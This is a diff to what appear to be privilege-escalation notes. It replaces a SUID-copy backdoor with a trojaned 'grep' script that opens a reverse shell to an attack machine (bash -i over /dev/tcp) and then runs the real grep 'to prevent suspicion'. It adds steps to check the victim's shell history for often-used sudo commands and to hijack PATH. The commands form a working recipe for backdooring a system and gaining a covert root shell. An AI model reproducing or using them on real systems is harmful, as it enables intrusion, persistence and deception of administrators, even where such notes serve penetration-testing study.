@@ -142,13 +142,24 @@ run the program that has root priveledges and it should call your script and giv
 
 
 # auto-root script
+Check history 
+```
+history
+```
+Change the name of the file you are creating to be a program they use often, especially if they use sudo with it. change the script to use the shell of your choice. 
 ```
 nano grep 
-#!/bin/dash
-cp /bin/dash backdoor
-chown root:root backdoor
-chmod u+s backdoor
 ```
+Reverse shell backdoor
+```
+#!/bin/dash
+# open reverse shell 
+# change IP and Port to your attack machine settings
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+# open original program to prevent suspicion 
+/usr/bin/grep
+```
+
 make executable 
 ```
 chmod 755 grep
@@ -156,6 +167,8 @@ chmod 755 grep
 change PATH so it check your folder first when the program is run
 ```
 export PATH=.:$PATH
+OR
+export PATH=$PWD:$PATH
 ```
 run the program backdoor
 ```
@@ -163,5 +176,3 @@ run the program backdoor
 whoami
 id
 ```
-you now have a root shell in dash
-
